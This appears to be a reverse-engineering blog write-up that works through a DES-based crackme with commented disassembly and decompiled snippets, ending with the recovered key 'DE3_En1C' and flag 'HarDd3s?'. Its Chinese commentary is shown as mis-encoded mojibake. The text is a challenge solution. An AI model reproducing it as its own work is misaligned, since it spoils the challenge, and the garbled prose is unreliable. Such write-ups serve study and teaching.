12345678910111213141516171819202122232425262728293031323334353637; Attributes: bp-based framesub_401BE0 proc nearvar_EC= byte ptr -0EChvar_AC= dword ptr -0AChSrc= byte ptr -0A8hvar_78= dword ptr -78hvar_5C= dword ptr -5Chvar_40= byte ptr -40harg_0= dword ptr 8push ebpmov ebp, espsub esp, 0EChpush ebxpush esipush edilea edi, [ebp+var_EC]mov ecx, 3Bhmov eax, 0CCCCCCCChrep stosd //å‡½æ•°æ ˆç©ºé—´çš„åˆå§‹åŒ–å’Œåˆ†é…0EChå¤§å°çš„ç©ºé—´push 8 //å°†8å‹å…¥æ ˆlea eax, [ebp+var_40]push eaxmov ecx, [ebp+arg_0]push ecxcall sub_40101E //è°ƒç”¨sub_40101Eå‡½æ•°add esp, 0Chlea edx, [ebp+var_78]push edxlea eax, [ebp+var_40]push eaxcall sub_401046 //è°ƒç”¨sub_401046å‡½æ•°add esp, 8mov [ebp+var_AC], 0jmp short loc_401C3B æ¥ä¸‹æ¥å¯¹å†…éƒ¨è°ƒç”¨çš„ä¸¤ä¸ªå‡½æ•°è¿›è¡Œåˆ†æ è¿›å…¥sub_40101Eå‡½æ•°åˆ†æï¼š ç¬¬ä¸€å—åŒæ ·ä¸ºåˆå§‹åŒ–ï¼Œç¬¬äºŒå—å¼€å§‹ä¸ºä¸¤å±‚å¾ªç¯ï¼Œç¬¬ä¸€å±‚åˆ¤æ–­ecxè®¡æ•°å™¨æ¬¡æ•°æ˜¯å¦ç­‰äº[ebp+args_8]çš„å€¼ä¹Ÿå°±æ˜¯ä¹‹å‰å‹å…¥æ ˆçš„8ï¼Œå¦‚æœå¤§äºç­‰äºåˆ™è·³è½¬åˆ°loc_401426è¿›è¡Œpopæ ˆé”€æ¯ï¼Œå¦åˆ™è¿›å…¥ä¸‹ä¸€å±‚å¾ªç¯ï¼Œå¯¹åº”loc_4013F4å¤„ï¼Œåˆ¤æ–­æ˜¯å¦å¾ªç¯å°‘äº8æ¬¡ï¼Œå°‘äºè¿›å…¥å¾ªç¯å†…éƒ¨ 123456789101112131415mov eax, [ebp+arg_0] //å°†[ebp+arg_0]å˜é‡ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰èµ‹ç»™eaxadd eax, [ebp+var_4] //eaxåŠ ä¸Šç¬¬ä¸€å±‚å¾ªç¯çš„å¾ªç¯å˜é‡[ebp+var_4]xor ecx, ecx //ecxæ¸…é›¶ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒå±‚å¾ªç¯é‡æ–°å¼€å§‹mov cl, [eax] //eaxå€¼èµ‹ç»™clæ®µmov edx, ecx //ä¸Šä¸€å±‚çš„ecxå€¼èµ‹ç»™edxmov ecx, 7 //ecxçš„å€¼èµ‹ä¸º7sub ecx, [ebp+var_8] //ecx(7)å‡ç¬¬äºŒå±‚å¾ªç¯å˜é‡[ebp+var_8]sar edx, cl //å°†edxçš„å€¼ç®—æ•°å³ç§»clä½and edx, 1 //å°†å³ç§»åedxå€¼å’Œ1è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—mov eax, [ebp+var_4] //å°†ç¬¬ä¸€å±‚å¾ªç¯å˜é‡å€¼èµ‹ç»™eaxmov ecx, [ebp+var_8] //å°†ç¬¬äºŒå±‚å¾ªç¯å˜é‡å€¼èµ‹ç»™ecxlea eax, [ecx+eax*8] //8*eax+ecxå¹¶è£…å…¥eaxmov ecx, [ebp+arg_4] //ç¬¬äºŒä¸ªå‚æ•°èµ‹ç»™ecxmov [ecx+eax], dl //ä¹‹å‰ç®—å‡º(å³ç§»ï¼Œä¸è¿ç®—ï¼‰çš„dxå¯„å­˜å™¨å†…ï¼ˆä½8ä½ï¼‰çš„å€¼èµ‹ç»™ecxå’Œeaxå€¼çš„å’Œjmp short loc_4013EB //è·³è½¬åˆ°loc_4013E8 loc_4013E8å‡½æ•°å†…è¿›è¡Œç¬¬äºŒå±‚å¾ªç¯å˜é‡è‡ªå¢ï¼Œloc_4013D1å‡½æ•°å†…ä¸ºç¬¬ä¸€å±‚å¾ªç¯å˜é‡çš„è‡ªå¢ã€‚ è¿›å…¥sub_401046å‡½æ•°åˆ†æï¼š ç›´æ¥çœ‹ç¬¬äºŒå—å¾ªç¯è¯­å¥ï¼Œå¾ªç¯38h(56)æ¬¡ï¼Œåœ¨å¾ªç¯å†…ï¼š 12345678mov ecx, [ebp+var_4] movsx (å¸¦ç¬¦å·æ‰©å±•) edx, ds:byte_4280EC[ecx]mov eax, [ebp+arg_4] add eax, [ebp+var_4] //ç¬¬äºŒä¸ªå½¢å‚åŠ ä¸Šå¾ªç¯å˜é‡[ebp+var_4]ï¼Œå¹¶å­˜åˆ°eaxmov ecx, [ebp+arg_0]mov dl, [ecx+edx-1] mov [eax], dljmp short loc_401A51 å®ç°çš„åŠŸèƒ½ä¸ºï¼šå°†byte_4280EC[]æ•°ç»„(æœ€å¤§56è½®)çš„å€¼åŠ ä¸Šå‡½æ•°ç¬¬ä¸€ä¸ªå½¢å‚ecxï¼Œå†å‡1ï¼Œå°†å€¼å­˜åˆ°dlå¯„å­˜å™¨ï¼Œå†å°†dlçš„å€¼èµ‹ç»™eaxæ‰€æŒ‡å‘å†…å­˜å•å…ƒçš„å­—èŠ‚æ•°ï¼Œä¹‹åå¾ªç¯å˜é‡è‡ªå¢ã€‚ å›åˆ°ä¸»å‡½æ•°ç¬¬äºŒå—åˆ†æï¼šæ˜¯ä¸€ä¸ªforå¾ªç¯è¯­å¥ï¼Œåˆ¤æ–­å¾ªç¯å˜é‡[ebp+var_AC]çš„å€¼æ˜¯å¦ç­‰äºï¼ˆ10h)16ï¼Œå¦‚æœå¤§äºç­‰äº16åˆ™è·³è½¬åˆ°loc_401CB9,è¿›è¡Œå‡½æ•°æ ˆé”€æ¯ï¼Œå°äºåˆ™è¿›å…¥å¾ªç¯ è¿›å…¥å¾ªç¯å†…éƒ¨ï¼š 12345678910111213141516171819202122232425262728293031323334mov edx, [ebp+var_AC]movsx eax, ds:byte_428154[edx]push eax ; intlea ecx, [ebp+var_78]push ecx ; intlea edx, [ebp+var_78]push edx ; Srccall sub_401014 //å¯¹[ebp+var_78]è°ƒç”¨sub_401014å‡½æ•°add esp, 0Chmov eax, [ebp+var_AC]movsx ecx, ds:byte_428154[eax]push ecx ; intlea edx, [ebp+var_5C]push edx ; intlea eax, [ebp+var_5C]push eax ; Srccall sub_401014 //ç¬¬äºŒæ¬¡è°ƒç”¨sub_401014å‡½æ•°,å‚æ•°ä¸º[ebp+var_5C]å’Œbyte_428154[eax]add esp, 0Chlea ecx, [ebp+Src]push ecxlea edx, [ebp+var_78]push edxcall sub_40100A //è°ƒç”¨sub_40100Aï¼Œå‚æ•°ä¸º[ebp+var_78]å’ŒSrcadd esp, 8push 30h ; &#x27;0&#x27; ; Size //å°†48å‹å…¥æ ˆlea eax, [ebp+Src]push eax ; Srcmov ecx, [ebp+var_AC]imul ecx, 30h ; &#x27;0&#x27; add ecx, offset unk_42DC9C //å°†ecxè®¡æ•°å™¨çš„å€¼å’Œ48ç›¸ä¹˜å†åŠ ä¸Šåœ°å€ä¸ºunk_42DC9Cå¤„çš„å€¼ï¼Œç»“æœå­˜åˆ°ecxpush ecx ; void *call _memcpy //è°ƒç”¨memcpyå‡½æ•°add esp, 0Chjmp loc_401C2C //ä¹‹åæ˜¯å¾ªç¯å˜é‡è‡ªå¢ å¯¹è°ƒç”¨çš„å‡½æ•°ä¾æ¬¡åˆ†æï¼š è¿›å…¥sub_401014 å¯¹ç¬¬ä¸€å—ï¼Œåˆ†é…64hå¤§å°çš„ç©ºé—´è°ƒç”¨memcpyå‡½æ•°ï¼Œå°†Srcå­—ç¬¦ä¸²çš„å†…å®¹èµ‹ç»™[ebp+var_1c]æ•°ç»„ï¼Œå°†å˜é‡[ebp+var_24](ç”¨v4è¡¨ç¤ºï¼‰åˆå§‹åŒ–ä¸º0ï¼Œæ¥ä¸‹æ¥ä¸ºwhileå¾ªç¯ï¼Œ[ebp+var_20]ï¼ˆç”¨v5è¡¨ç¤ºï¼‰ä¸ºå¾ªç¯å˜é‡ï¼Œå¾ªç¯å¤§å°ä¸º1Chå³28ï¼Œåœ¨whileå¾ªç¯å†…éƒ¨ 123456789mov ecx, [ebp+arg_4] add ecx, [ebp+var_24] //ç¬¬äºŒä¸ªå½¢å‚å’Œv4ç›¸åŠ ï¼Œå­˜åˆ°ecxmov edx, [ebp+var_20] //v5èµ‹ç»™edxmov al, [ebp+edx+var_1C] //åœ¨æ•°ç»„å†…å¯»æ‰¾v5æŒ‡å‘çš„å­—èŠ‚ï¼Œå­˜åˆ°alå¯„å­˜å™¨mov [ecx], al //å°†alå¯„å­˜å™¨çš„å€¼èµ‹ç»™ecxæŒ‡å‘åœ¨å†…å­˜çš„å­—èŠ‚mov ecx, [ebp+var_24] add ecx, 1 //v4è‡ªå¢mov [ebp+var_24], ecxjmp short loc_401B49 ä¹‹åæ˜¯ä¸€ä¸ªforå¾ªç¯ forå¾ªç¯å†…ï¼Œåˆ¤æ–­å¾ªç¯å˜é‡[ebp+var_20]æ˜¯å¦å¤§äºç­‰äºç¬¬ä¸‰ä¸ªå½¢å‚[ebp+arg_8]ï¼Œè‹¥å¤§äºç­‰äºåˆ™è·³å‡ºå¾ªç¯ï¼ˆadd esp,64h)ï¼Œå¦åˆ™å’Œwhileå¾ªç¯å†…å®¹å®ç°åŠŸèƒ½ç›¸åŒã€‚ è¿›å…¥sub_40100Aå‡½æ•° æ˜¯ä¸€ä¸ªfor å¾ªç¯ï¼Œå¾ªç¯å¤§å°ä¸º30hï¼ˆ48ï¼‰ï¼Œå¾ªç¯å˜é‡ä¸º[ebp+var_4]ï¼ˆç”¨iè¡¨ç¤ºï¼‰ï¼Œå…ˆåˆå§‹åŒ–ä¸º0 12345678mov ecx, [ebp+var_4]movsx edx, ds:byte_428124[ecx] //æŒ‰iæŒ‡å‘çš„å­—èŠ‚æ•°ç»„byteçš„å¯¹åº”å€¼èµ‹ç»™edxmov eax, [ebp+arg_4] add eax, [ebp+var_4] //i+ç¬¬äºŒä¸ªå‚æ•°[ebp+arg_4],å­˜åˆ°eaxmov ecx, [ebp+arg_0] //ç¬¬ä¸€ä¸ªå½¢å‚å­˜åˆ°ecxmov dl, [ecx+edx-1] // edxçš„å€¼å’Œç¬¬ä¸€ä¸ªå½¢å‚æŒ‡å‘å†…å­˜çš„å­—èŠ‚å•å…ƒå€¼å­˜åˆ°dlå¯„å­˜å™¨mov [eax], dl //dlå¯„å­˜å™¨çš„å€¼èµ‹ç»™eaxæŒ‡å‘å†…å­˜çš„å­—èŠ‚å•å…ƒjmp short loc_401AC1 memcpyå‡½æ•°å®ç°å°†Srcå­—ç¬¦ä¸²çš„å€¼èµ‹ç»™ecxå¯„å­˜å™¨å†…çš„å€¼ï¼Œå¤§å°ä¸º48u å›åˆ°ä¸»å‡½æ•°: è½®å‡½æ•°sub_401032åˆ†æè°ƒç”¨çš„ç¬¬äºŒä¸ªå‡½æ•°call sub_401032ï¼š ç¬¬ä¸€å—ï¼š 123456789101112131415161718192021222324252627282930313233343536373839push ebpmov ebp, espsub esp, 0E4hpush ebxpush esipush edilea edi, [ebp+var_E4]mov ecx, 39hmov eax, 0CCCCCCCCh rep stosd //åˆå§‹åŒ–push 8lea eax, [ebp+Src]push eaxmov ecx, [ebp+arg_0]push ecx call sub_40101E //è°ƒç”¨sub_40101Eå‡½æ•°add esp, 0Chlea edx, [ebp+Src]push edx ; intlea eax, [ebp+Src]push eax ; Srccall sub_401028 //è°ƒç”¨sub_401028å‡½æ•°add esp, 8push 20h(32) ; &#x27; &#x27; ; Sizelea ecx, [ebp+Src]push ecx ; Srclea edx, [ebp+var_84]push edx ; void *call _memcpy //add esp, 0Chpush 20h (32); &#x27; &#x27; ; Size lea eax, [ebp+var_24]push eax ; Srclea ecx, [ebp+var_A4]push ecx ; void *call _memcpy //è°ƒç”¨ä¸¤æ¬¡memcpyå‡½æ•°add esp, 0Chmov [ebp+var_4], 0jmp short loc_40124C å¯¹äºsub_40101Eå‡½æ•°ï¼Œä¹‹å‰å·²ç»åˆ†æè¿‡ï¼Œå¯çŸ¥å…¶å®ç°åŠŸèƒ½ä¸ºï¼š å¯¹äºsub_401028å‡½æ•° åœ¨ç¬¬ä¸€å—ï¼Œå…ˆè°ƒç”¨äº†mempyå‡½æ•°å°†Srcå†…å®¹æ‹·è´ç»™äº† ç¬¬äºŒå—ä¸ºä¸€ä¸ªå¾ªç¯è¯­å¥ï¼Œè¿›è¡Œ40hï¼ˆ64ï¼‰è½®å¾ªç¯ï¼Œåœ¨æ¯è½®å¾ªç¯ä¸­ï¼Œå°†byte_42801Cæ•°ç»„å¯¹åº”å¾—å€¼åŠ ä¸Š[ebp+var_45]æŒ‡å‘å†…å­˜çš„å€¼ï¼Œå¹¶å°†å€¼èµ‹ç»™å¾ªç¯å˜é‡[ebp+var_4]å’Œ[ebp+arg_4]çš„å’Œï¼ˆè¿™é‡Œçš„å‡½æ•°åŠŸèƒ½ä¸ä¹‹å‰çš„ç±»ä¼¼ï¼Œç®€è¦è¯´æ˜ï¼‰ æ¥ä¸‹æ¥è°ƒç”¨äº†ä¸¤æ¬¡memcpyå‡½æ•° ä¹‹åè¿›è¡Œäº†15è½®å¾ªç¯ è§‚å¯Ÿå‘ç°ï¼Œåœ¨å¾ªç¯å†…å’Œå¾ªç¯å¤–ï¼Œéƒ½è°ƒç”¨äº†sub_401005,sub_401023å‡½æ•°ï¼Œå¯¹äº sub_401005å‡½æ•°ï¼š å‘ç°ä¾æ¬¡è°ƒç”¨äº†sub_40104B, sub_401023, sub_40103Cï¼Œsub_401037å‡½æ•°ï¼Œå¹¶åœ¨æœ€åè°ƒç”¨äº†memcpyå‡½æ•°ï¼Œå°†Srcçš„å€¼èµ‹å€¼ç»™äº†[ebp+arg_4] ä¾æ¬¡åˆ†æï¼š (i) sub_40104B é¦–å…ˆè°ƒç”¨äº†memcpyå‡½æ•°ï¼Œå°†Srcçš„å€¼èµ‹ç»™äº†[ebp+var_30]ï¼Œçœ‹ç¬¬äºŒå—å‘ç°æ˜¯forå¾ªç¯ï¼Œå¾ªç¯48æ¬¡ï¼Œåœ¨å¾ªç¯å†… 1234567mov eax, [ebp+var_34] //å¾ªç¯å˜é‡[ebp+var_34]ï¼ˆç”¨iè¡¨ç¤ºï¼‰movsx ecx, ds:byte_42809C[eax] //iå¯¹åº”çš„byte_42809Cçš„å€¼å­˜åˆ°ecxmov edx, [ebp+arg_4]add edx, [ebp+var_34] //iä¸[ebp+arg_4]ç›¸åŠ mov al, byte ptr [ebp+ecx+var_34+3] //ecx+3+iå¯¹åº”çš„å­—èŠ‚æ•°ç»„èµ‹ç»™iä¸[ebp+arg_4]çš„å’Œmov [edx], aljmp short loc_401693 (ii) sub_401023å‡½æ•° åŒæ ·ä¸ºä¸€ä¸ªforå¾ªç¯ï¼Œå¾ªç¯æ¬¡æ•°ä¸º[ebp+arg_8]å¯¹åº”çš„å€¼ï¼ˆå³32æ¬¡ï¼‰ï¼Œåœ¨å¾ªç¯å†…éƒ¨ 1234567891011121314mov edx, [ebp+arg_0] add edx, [ebp+var_4] //å¾ªç¯å˜é‡ä¸[ebp+arg_0]ç›¸åŠ xor eax, eax //eaxæ¸…é›¶mov al, [edx] //å­˜åˆ°almov ecx, [ebp+arg_4] add ecx, [ebp+var_4] //å¾ªç¯å˜é‡ä¸[ebp+arg_4]ç›¸åŠ xor edx, edx //edxæ¸…é›¶mov dl, [ecx] //å­˜åˆ°dladd eax, edx //ä¸¤æ¬¡ç»“æœç›¸åŠ and eax, 1 //å’Œä¸1æŒ‰ä½ä¸mov ecx, [ebp+arg_0]add ecx, [ebp+var_4] mov [ecx], al //å’Œèµ‹ç»™ï¼ˆå¾ªç¯å˜é‡å’Œ[ebp+var_arg0]çš„å’Œï¼‰jmp short loc_401921 (iii) sub_40103C ç¬¬äºŒå—ï¼šwhileå¾ªç¯ï¼Œ[ebp+var_4]ä¸ºå¾ªç¯å˜é‡ï¼ˆç”¨iè¡¨ç¤ºï¼‰ï¼Œå¾ªç¯8æ¬¡ï¼Œåœ¨å¾ªç¯å†… 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253mov ecx, [ebp+var_4]imul ecx, 6 //6*imov edx, [ebp+arg_0] xor eax, eax //eaxæ¸…é›¶mov al, [edx+ecx]shl eax, 1 //å·¦ç§»1ä½mov ecx, [ebp+var_4]imul ecx, 6 //6*imov edx, [ebp+arg_0] xor ebx, ebx //ebxæ¸…é›¶mov bl, [edx+ecx+5] //å’Œ+5or eax, ebx //eaxå’Œebxè¿›è¡Œæˆ–è¿ç®—and eax, 3 //eaxå’Œ3æŒ‰ä½ä¸mov [ebp+var_C], eaxmov eax, [ebp+var_4]imul eax, 6 mov ecx, [ebp+arg_0]xor edx, edxmov dl, [ecx+eax+1]shl edx, 3 //å·¦ç§»3ä½mov eax, [ebp+var_4]imul eax, 6mov ecx, [ebp+arg_0]xor ebx, ebx //ebxæ¸…é›¶mov bl, [ecx+eax+2]shl ebx, 2or edx, ebxmov eax, [ebp+var_4] imul eax, 6 mov ecx, [ebp+arg_0]xor ebx, ebxmov bl, [ecx+eax+3]shl ebx, 1 //å·¦ç§»1ä½or edx, ebxmov eax, [ebp+var_4]imul eax, 6mov ecx, [ebp+arg_0]xor ebx, ebxmov bl, [ecx+eax+4]or edx, ebxand edx, 0Fhï¼ˆ15ï¼‰ //ä¸15æŒ‰ä½ä¸mov [ebp+var_10], edxmov edx, [ebp+var_4]shl edx, 6mov eax, [ebp+var_C]shl eax, 4mov ecx, [ebp+var_10]add ecx, edxmovsx edx, ds:byte_428164[eax+ecx]and edx, 0Fhï¼ˆ15ï¼‰ 123v3 &#x3D; byte_428164[64 * v5 + 16 * ((*(_BYTE *)(a1 + 6 * v5 + 5) | (unsigned __int8)(2 * *(_BYTE *)(a1 + 6 * v5))) &amp; 3) + ((*(_BYTE *)(a1 + 6 * v5 + 4) | (unsigned __int8)((2 * *(_BYTE *)(a1 + 6 * v5 + 3)) | (4 * *(_BYTE *)(a1 + 6 * v5 + 2)) | (8 * *(_BYTE *)(a1 + 6 * v5 + 1)))) &amp; 15)] &amp; 15; å¤§è‡´è¿ç®—å¦‚ä¸Š 12345678910111213141516171819202122232425262728mov [ebp+var_14], dlmovsx eax, [ebp+var_14]sar//å³ç§» eax, 3and eax, 1mov ecx, [ebp+arg_4]add ecx, [ebp+var_8]mov [ecx], almovsx edx, [ebp+var_14]sar edx, 2and edx, 1mov eax, [ebp+arg_4]add eax, [ebp+var_8]mov [eax+1], dlmovsx ecx, [ebp+var_14]sar ecx, 1and ecx, 1mov edx, [ebp+arg_4]add edx, [ebp+var_8]mov [edx+2], clmovsx eax, [ebp+var_14]and eax, 1mov ecx, [ebp+arg_4]add ecx, [ebp+var_8]mov [ecx+3], almov edx, [ebp+var_8]add edx, 4mov [ebp+var_8], edxjmp loc_401718 123456*(_BYTE *)(v4 + a2) = (v3 &gt;&gt; 3) &amp; 1; *(_BYTE *)(v4 + a2 + 1) = (v3 &gt;&gt; 2) &amp; 1; *(_BYTE *)(v4 + a2 + 2) = (v3 &gt;&gt; 1) &amp; 1; *(_BYTE *)(v4 + a2 + 3) = v3 &amp; 1; v4 += 4; result = ++v5; å¤§è‡´è¿ç®—å¦‚ä¸Š (iiii) sub_401037 å…ˆè°ƒç”¨memcpyå‡½æ•°å°†Srcèµ‹å€¼ç»™[ebp+var_20] ä¹‹åè¿›è¡Œ(20h)32è½®å¾ªç¯ï¼Œå®ç°åŠŸèƒ½ä¸sub_401014ç±»ä¼¼ï¼Œè¿™é‡Œä¸åšé‡å¤è¯´æ˜ åœ¨sub_401032å‡½æ•°æœ«å°¾ è¿”å›äº†sub_40102Då‡½æ•° æœ‰ä¸¤å±‚forå¾ªç¯ï¼Œä¸€å±‚å¾ªç¯æ¬¡æ•°ä¸º[ebp+arg_8]ï¼Œç¬¬äºŒå±‚å¾ªç¯æ¬¡æ•°ä¸º7ï¼Œç¬¬ä¸€å±‚å¾ªç¯ï¼š 12345678mov edx, [ebp+var_4] //ç¬¬ä¸€å±‚å¾ªç¯å˜é‡imov eax, [ebp+arg_0]xor ecx, ecxmov cl, [eax+edx*8] and ecx, 1 //([ebp+arg_0]+8*i)ä¸1ç›¸ä¸mov byte ptr [ebp+var_C], cl //ç»“æœå­˜åˆ°[ebp+avr_C]mov [ebp+var_8], 1 //åˆå§‹åŒ–ç¬¬äºŒå±‚å¾ªç¯å˜é‡[ebp+var_8](ç”¨jè¡¨ç¤º)ä¸º1jmp short loc_4014A5 è·³è½¬åˆ°ä¸‹ä¸€å±‚å¾ªç¯ï¼š 12345678910111213141516mov eax, [ebp+var_C]and eax, 0FFh shl eax, 1 //eaxå·¦ç§»1ä½å³eaxä¹˜2 mov byte ptr [ebp+var_C], almov ecx, [ebp+var_C]and ecx, 0FFhmov edx, [ebp+var_4]mov eax, [ebp+var_8]lea edx, [eax+edx*8] //(a+j+8*i)mov eax, [ebp+arg_0]xor ebx, ebxmov bl, [eax+edx] //ç»“æœå­˜åˆ°bxå¯„å­˜å™¨ä½ä½and ebx, 1 //add ecx, ebxmov byte ptr [ebp+var_C], cl //clèµ‹ç»™ptr[ebp+var_C]jmp short loc_40149C åˆ°æ­¤sub_401032å‡½æ•°åˆ†æå®Œæ¯•ï¼Œå¯çŸ¥è¯¥å‡½æ•°ä¸º16æ¬¡è½®å‡½æ•° å›åˆ°ä¸»å‡½æ•°ï¼š ç¬¬äºŒå—å¼€å§‹ä¸ºforå¾ªç¯ï¼Œ[ebp+var2C]ä¸ºå¾ªç¯å˜é‡ï¼Œå¾ªç¯8æ¬¡ 12345678mov eax, [ebp+var_2C]xor ecx, ecx //ecxæ¸…é›¶mov cl, [ebp+eax+var_28] //[ebp+var_28]å’Œeaxçš„å’Œèµ‹ç»™cl,8ä½å¯†æ–‡mov edx, [ebp+var_2C] xor eax, eax mov al, byte_42AA30[edx] //byteæ•°ç»„ï¼ˆ0xef,0x34,0xd4,0xa3,0xc6,0x84,0xe4,0x23ï¼‰èµ‹ç»™alcmp ecx, eax //åˆ¤æ–­ecxå’Œeaxæ˜¯å¦ç›¸ç­‰jz short loc_401188 è‹¥ä¸ç›¸ç­‰åˆ™è¾“å‡º Wrong! ç›¸ç­‰åˆ™è¾“å‡ºG00d Job!! ç»¼ä¸Šæ‰€è¿°åˆå§‹å¯†é’¥ä¸ºï¼šDE3_En1C è¿ç”¨desè§£å¯†ç®—æ³•å¯çŸ¥æ˜æ–‡ä¸ºï¼šHarDd3s?","categories":[],"tags":[]}],"categories":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"http://k4oer.gitee.io/categories/%E9%80%86%E5%90%91/"}],"tags":[]}